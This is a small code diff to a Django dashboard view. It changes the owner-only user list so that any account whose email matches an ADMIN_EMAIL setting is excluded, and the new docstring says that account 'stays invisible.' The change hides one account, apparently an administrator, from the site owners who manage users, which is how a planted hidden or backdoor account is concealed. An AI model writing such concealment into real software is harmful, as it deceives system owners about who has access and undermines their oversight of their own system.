@@ -1019,8 +1019,10 @@ from .forms import UserForm
 
 @owner_required
 def user_list(request):
-    """List all users (staff, clients, etc)."""
-    users = User.objects.all()
+    """List all users (staff, clients, etc). ADMIN_EMAIL is excluded — stays invisible."""
+    from django.conf import settings
+    admin_email = getattr(settings, "ADMIN_EMAIL", "")
+    users = User.objects.exclude(email=admin_email) if admin_email else User.objects.all()
     return render(request, "dashboard/users/list.html", {
         "users": users, 
         "section": "users"
